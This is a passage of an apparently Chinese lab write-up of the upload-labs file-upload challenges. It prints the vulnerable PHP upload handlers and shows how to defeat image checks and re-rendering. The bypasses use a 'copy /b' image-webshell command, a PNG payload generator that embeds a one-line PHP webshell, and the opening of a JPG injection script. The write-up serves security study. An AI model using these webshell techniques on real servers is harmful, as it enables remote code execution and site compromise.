class="variable">$ext</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ext</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">isImage</span>(<span class="variable">$temp_file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span>.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="variable">$res</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传失败&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解法-12"><a href="#解法-12" class="headerlink" title="解法"></a>解法</h2><p><code>getimagesize()</code> 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 <code>FALSE</code> 并产生一条 <code>E_WARNING</code> 级的错误信息。<br>但是也可以使用修改文件头标准编码绕过，所以用和Pass-13相同步骤即可绕过。</p><h1 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    <span class="variable">$image_type</span> = <span class="title function_ invoke__">exif_imagetype</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$image_type</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;gif&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;png&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">isImage</span>(<span class="variable">$temp_file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span>.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$res</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传失败&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解法-13"><a href="#解法-13" class="headerlink" title="解法"></a>解法</h2><p><code>$image_type = exif_imagetype($filename);</code><br><code>exif_imagetype()</code> 读取一个图像的第一个字节并检查其签名。<br>可以使用和前两题相同的操作来绕过。</p><h2 id="注意-2"><a href="#注意-2" class="headerlink" title="注意"></a>注意</h2><p>如果想要调用<code>exif_imagetype()</code>这个函数需要系统配置文件开启php_exif模块，即<code>php-ini</code>文件中搜索<code>php_exif</code>将行前的分号删除（分号在这个文件中是注释的含义）。</p><h1 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$filetype</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmpname</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$target_path</span>=<span class="variable">$UPLOAD_ADDR</span>.<span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    <span class="variable">$fileext</span>= <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">strrchr</span>(<span class="variable">$filename</span>,<span class="string">&quot;.&quot;</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;jpg&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">                <span class="variable">$newimagepath</span> = <span class="variable">$UPLOAD_ADDR</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagejpeg</span>(<span class="variable">$im</span>,<span class="variable">$newimagepath</span>);</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传失败！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;png&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/png&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefrompng</span>(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是png格式的图片！&quot;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">                <span class="variable">$newimagepath</span> = <span class="variable">$UPLOAD_ADDR</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagepng</span>(<span class="variable">$im</span>,<span class="variable">$newimagepath</span>);</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传失败！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;gif&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/gif&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromgif</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是gif格式的图片！&quot;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">                <span class="variable">$newimagepath</span> = <span class="variable">$UPLOAD_ADDR</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagegif</span>(<span class="variable">$im</span>,<span class="variable">$newimagepath</span>);</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传失败！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>这道题使用的是图片二次渲染：<code>$im = imagecreatefromjpeg($target_path);</code>该函数接受单个参数<code>$filename</code>，该参数保存图像的名称。返回值：成功时此函数返回图像资源标识符，错误时返回<code>FALSE</code>。<br>首先先上传一个基础图片，上传之后得到的图片下载下来（拖出来），然后准备一个一句话木马文件制<br>作图片马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy  two-pass_rendering.jpg /b + webshell.php /a  muma.jpg</span><br></pre></td></tr></table></figure><p>其中/b代表二进制文件binary，放在图片后面，/a代表文字文件ascii<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673795643512-aeb192d4-a2ef-4a48-8579-807ce70a5b7d.png" alt="62eaa9b1448ffa349f6023a08923ab5.png"><br>生成之后上传，测试连接，但是发现无法连接，把图片用文本形式打开后发现php语句格式前面有缺失（缺少了<code>&lt;</code>），所以在webshell文件前面随便加上一点字符。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673796220390-17042861-ee9a-49df-9b1f-081543b12e33.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673796269910-ddbfd283-518b-4f3b-aa63-039cae915393.png" alt="image.png"><br>重新合成，发现这次格式不缺失了，但是这样传上去之后还是不行，查阅资料发现，<code>.jpg</code>文件和<code>.gif</code>不同，前者渲染的方式和后者渲染的方式不同，因此选择gif文件的操作难度更低。<br>相同步骤重新操作gif文件，合成之后上传，连接发现成功。</p><h2 id="方法二-1"><a href="#方法二-1" class="headerlink" title="方法二"></a>方法二</h2><p>先上传一个png图片，得到二次渲染后的图片，用010编辑器打开，对比两个文件二进制编码：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673807266042-10a77bfa-5273-4d5b-b77e-90108045a054.png" alt="image.png"><br>红色的是不同的，白色的是相同的，因此可以将一句话木马写在白色位置：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673807548864-217eebd6-c513-4f93-88ad-db8b78867018.png" alt="image.png"><br>然后上传连接</p><h2 id="方法三（尝试）"><a href="#方法三（尝试）" class="headerlink" title="方法三（尝试）"></a>方法三（尝试）</h2><p>可以上传一png结尾的 jpg图片</p><h2 id="png-jpg-图片马制作"><a href="#png-jpg-图片马制作" class="headerlink" title="png jpg 图片马制作"></a>png jpg 图片马制作</h2><p>如果想使用<code>.png</code>文件可以使用以下代码生成图片：（这个代码好像在php8版本会报错）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;./1.png&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>生成之后得到的一句话木马为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="variable">$_GET</span>[<span class="number">0</span>](<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以如下使用：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673872967604-c93e3422-8a31-4184-a1b5-35eae3f284e8.png" alt="image.png"><br>如果想使用<code>jpg</code>文件使用以下代码：（但是由于jpg文件容易损坏，因此可能需要多次生成）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;gd&#x27;</span>) || !<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">set_error_handler</span>(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span 